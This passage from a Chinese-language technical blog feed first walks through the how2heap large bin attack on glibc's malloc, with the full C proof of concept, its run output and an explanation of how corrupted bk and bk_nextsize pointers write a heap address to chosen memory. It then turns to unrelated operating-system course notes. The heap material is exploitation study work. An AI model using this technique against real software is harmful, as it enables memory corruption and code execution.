victim;</span><br></pre></td></tr></table></figure><h2 id="How2heap-large-bin-attack"><a href="#How2heap-large-bin-attack" class="headerlink" title="How2heap large_bin_attack"></a>How2heap large_bin_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/ctext&gt; ./large_bin_attack</span><br><span class="line">This file demonstrates large bin attack by writing a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">&#x27;</span>s first look at the targets we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">stack_var1 (<span class="number">0x7fffffffdca8</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdcb0</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: <span class="number">0x603000</span></span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x603360</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x6037a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 &lt;--&gt; 0x603000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now, we <span class="built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 &lt;--&gt; 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force <span class="built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="built_in">stack</span> variables, we <span class="built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let&#x27;s <span class="built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line"><span class="title function_">stack_var1</span> <span class="params">(<span class="number">0x7fffffffdca8</span>)</span>: 0x6037a0</span><br><span class="line"><span class="title function_">stack_var2</span> <span class="params">(<span class="number">0x7fffffffdcb0</span>)</span>: 0x6037a0</span><br></pre></td></tr></table></figure><h3 id="先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk"><a href="#先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk" class="headerlink" title="先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk"></a>先申请了三个chunk和一些小chunk防止topchunk合并，释放掉前两个chunk</h3><p><img src="/2023/03/24/Large-bin-attack/image-20230323235004320.png" alt="image-20230323235004320"></p><h3 id="void-p4-x3D-malloc-0x90"><a href="#void-p4-x3D-malloc-0x90" class="headerlink" title="void* p4 &#x3D; malloc(0x90);"></a>void* p4 &#x3D; malloc(0x90);</h3><p>这一步执行时，所有bin没有合适大小的chunk，会发生上面源码里的合并</p><ul><li>从unsorted bin中拿出最后一个p1放入small bin</li><li>从unsorted bin中拿出最后一个p2放入large bin</li><li>从smallbin里分割chunk p1给p4，把剩余部分再次放入unsortedbin</li></ul><p><img src="/2023/03/24/Large-bin-attack/image-20230323235716579.png" alt="image-20230323235716579"></p><h3 id="free-p3"><a href="#free-p3" class="headerlink" title="free(p3)"></a>free(p3)</h3><p>进入unsortedbin</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000149331.png" alt="image-20230324000149331"></p><h3 id="模拟漏洞"><a href="#模拟漏洞" class="headerlink" title="模拟漏洞"></a>模拟漏洞</h3><p>修改后</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000347943.png" alt="image-20230324000347943"></p><p>p2-&gt;size&#x3D;0x3f1</p><p>p2-&gt;bk&#x3D;stack_var1_addr - 0x10</p><p>p2-&gt;bk_nextsize&#x3D;stack_var2_addr - 0x20</p><h3 id="malloc-0x90"><a href="#malloc-0x90" class="headerlink" title="!!malloc(0x90);!!"></a>!!malloc(0x90);!!</h3><p>这个时候我们还是会触发上面源码</p><ul><li>从unsorted bin中拿出最后一个切割p1放入small bin</li><li>从unsorted bin中拿出最后一个p3放入large bin</li><li>从smallbin里分割分割过的p1给malloc，把剩余部分再次放入unsortedbin</li></ul><p>从unsorted bin中拿出最后一个p3放入large bin这个过程就是我们的利用过程</p><p>我们把p2-&gt;size&#x3D;0x3f1可以绕过<code> while ((unsigned long) size &lt; fwd-&gt;size)</code>，来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><strong>此时victim为p3，fwd为p2</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P3-&gt;fd_nextsize = P2</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize=stack_var2_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">P2-&gt;bk_nextsize =P3</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = *（stack_var2_addr<span class="number">-0x20</span>+<span class="number">0x20</span>)= *（stack_var2_addr）=P3</span><br></pre></td></tr></table></figure><p>来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;bk=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;fd=p2</span><br><span class="line"></span><br><span class="line">p2-&gt;bk=p3</span><br><span class="line"></span><br><span class="line">p2-&gt;bk-&gt;fd=*(stack_var1_addr - <span class="number">0x10</span>+<span class="number">0x10</span>)=*(stack_var1_addr）=P3</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果我们可以在largebin构造bk和bk_nextsize构造tar1-0x10,tar2-0x20，可以在malloc将unsortedbin里的chunk(这个chunk要比largebin里面的chunk大)写入largebin时在tar1和tar2写入这个chunk的地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:操作系统上的程序</title>
      <link href="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/2.slides#/">http://jyywiki.cn/OS/2022/slides/2.slides#/</a></p><h1 id="操作系统上的程序"><a href="#操作系统上的程序" class="headerlink" title="操作系统上的程序"></a>操作系统上的程序</h1><h2 id="数字电路与状态机"><a href="#数字电路与状态机" class="headerlink" title="数字电路与状态机"></a>数字电路与状态机</h2><h3 id="数字逻辑电路：模拟器"><a href="#数字逻辑电路：模拟器" class="headerlink" title="数字逻辑电路：模拟器"></a>数字逻辑电路：模拟器</h3><p>“¬”、“∧”、“∨”非与或</p><p><em>X</em>′&#x3D;¬<em>X</em>∧<em>Y</em></p><p><em>Y</em>′&#x3D;¬<em>X</em>∧¬<em>Y</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGS_FOREACH(_)  _(X) _(Y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_LOGIC        X1 = !X &amp;&amp; Y; \    <span class="comment">//用于多行宏</span></span></span><br><span class="line">                         Y1 = !X &amp;&amp; !Y;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE(X)        static int X, X##1; <span class="comment">//两个##是连接符，即把两个宏变量拼接到一起</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UPDATE(X)        X = X##1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT(X)         printf(#X <span class="string">&quot; = %d; &quot;</span>, X); <span class="comment">//#的作用就是把后面的参数当做一个字符串，也就是说等同于把后面的宏变量加上双引号</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  REGS_FOREACH(DEFINE)</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// clock</span></span><br><span class="line">    RUN_LOGIC</span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(PRINT)</span></span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(UPDATE)</span></span><br><span class="line">    <span class="title function_">putchar</span><span class="params">(<span class="string">&#x27;\n&#x27;</span>)</span>; sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;   </span><br><span class="line">可以用gcc -E 看下预处理结果</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> X, X1; <span class="type">static</span> <span class="type">int</span> Y, Y1;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    X1 = !X &amp;&amp; Y; Y1 = !X &amp;&amp; !Y;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;X&quot;</span> <span class="string">&quot; = %d; &quot;</span>, X); <span class="built_in">printf</span>(<span class="string">&quot;Y&quot;</span> <span class="string">&quot; = %d; &quot;</span>, Y);</span><br><span class="line">    X = X1; Y = Y1;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>); sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">grxer@grxer ~/D/s/N/p2&gt; ./simulator </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br></pre></td></tr></table></figure><p>嵌套宏的展开</p><blockquote><ul><li>一般的宏嵌套展开规则是<strong>由内向外</strong>，先将内层宏展开，再把外层宏展开</li><li>如果宏的参数直接带有<code>#</code>，则不会展开内层的嵌套宏</li><li>如果宏的参数直接带有<code>##</code>，则会先将参数通过<code>##</code>拼接，然后再依次进行展开</li></ul></blockquote><p>这里采用了一个<strong>X-MACRO</strong>的高级宏的写法,个人认为就是写一个宏再利用宏嵌套去代替我们做一些重复性的工作</p><blockquote><p>x-macro创建一段自我维护和相互依赖的代码。当程序的一部分发生变化导致另一部分发生变化时，就可以说代码是相互依赖的。</p><p><strong>X宏的优势</strong></p><ul><li>X-Macros 通过创建单独的头文件以实现可维护，广泛用于操作系统开发</li><li>有助于轻松维护复杂的编程</li><li>它可以创建一段自我维护和相互依赖的代码</li></ul><p><strong>X宏的缺点</strong></p><ul><li>代码变得不那么可读了</li><li>代码很难理解</li><li>通常仅用于内部编程，如 OS 编程。</li></ul></blockquote><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>Too Long ；Didn’t Read</p><p>帮助我们更快的从man手册里获取信息</p><h2 id="什么是程序"><a href="#什么是程序" class="headerlink" title="什么是程序"></a>什么是程序</h2><h3 id="源代码视角"><a href="#源代码视角" class="headerlink" title="源代码视角"></a>源代码视角</h3><p>程序就是状态机</p><ul><li>状态 &#x3D; 堆 + 栈</li><li>初始状态 &#x3D; <code>main</code> 的第一条语句</li><li>迁移 &#x3D; 执行一条简单语句</li></ul><p>递归的汉诺塔，经典分治算法，每次都把n-1当作一个整体，把n-1挪到辅助位，把最下面移到目标，再把辅助位上n-1移到目标</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, via, to);</span><br><span class="line">    hanoi(<span class="number">1</span>,     from, to,  via);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, via,  to,  from);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归，个人感觉其实还是一个递归的思想，只是我们没有用c来帮助我们调用函数，而是在c的层面上做了一层抽象，把底层的栈帧给抽象出来，来模拟调用，让我们更形象的看到状态的转移，理解程序是个状态机</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> pc, n;</span><br><span class="line">  <span class="type">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> goto(loc) (&#123; f-&gt;pc = (loc) - 1; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to); <span class="keyword">goto</span>(<span class="number">4</span>); &#125; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二进制视角"><a href="#二进制视角" class="headerlink" title="二进制视角"></a>二进制视角</h3><p>还是状态机</p><ul><li>状态 &#x3D; 内存 M + 寄存器 R</li><li>初始状态 &#x3D; 动态链接器ld去做动态链接&#x3D;ld-linux-x86-64.so加载libc</li><li>迁移 &#x3D; 执行一条指令</li></ul><p>所有的指令都只能计算</p><p>想要操作一些硬件资源必须经过操作系统，系统调用syscall</p><p>程序 &#x3D; 计算 + syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">  movq $SYS_write, %rax   // write(</span><br><span class="line">  movq $1,         %rdi   //   fd=1,</span><br><span class="line">  movq $st,        %rsi   //   buf=st,</span><br><span class="line">  movq $(ed - st), %rdx   //   count=ed-st</span><br><span class="line">  syscall                 // );</span><br><span class="line"></span><br><span class="line">  movq $SYS_exit,  %rax   // exit(</span><br><span class="line">  movq $1,         %rdi   //   status=1</span><br><span class="line">  syscall                 // );//这里直接是个内核态的syscall</span><br><span class="line"></span><br><span class="line">st:</span><br><span class="line">  .ascii &quot;\033[01;31mHello, OS World\033[0m\n&quot;</span><br><span class="line">ed:</span><br><span class="line">;gcc -c minimal.S &amp;&amp; ld minimal.o </span><br></pre></td></tr></table></figure><p>我们之前做过一些x86——32和64的系统调用分析<a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a></p><ol><li>cpp–&gt;*.i(ascii中间文件) 预处理器   gcc -E <strong>预处理</strong> 预处理器先将#include #define（宏）等预处理指令进行替换和展开–hello.i</li><li>cc1–&gt;*.s(ascii汇编语言文件) 编译器  gcc -S <strong>编译</strong> 编译器产生两个源文件的汇编代码p1.s p2.s–hello.s</li><li>as–&gt;*.o(可重定位目标文件) 汇编器    gcc -c <strong>汇编</strong> 汇编器将汇编代码转化为可重定位目标代码文件 p1.o p2.o 但是没有填入全局值的地址 hell.o</li><li>ld–&gt;*.out(可执行目标文件) 链接器  ld *.o  <strong>链接</strong> 链接器将目标代码文件与库函数（如printf）合并 生成可执行文件p链接器的任务之一就是为函数调用找到匹配的函数的可执行代码的位置</li></ol><h3 id="main-的开始-x2F-结束并不是整个程序的开始-x2F-结束"><a href="#main-的开始-x2F-结束并不是整个程序的开始-x2F-结束" class="headerlink" title="main() 的开始&#x2F;结束并不是整个程序的开始&#x2F;结束"></a><code>main()</code> 的开始&#x2F;结束并不是整个程序的开始&#x2F;结束</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, 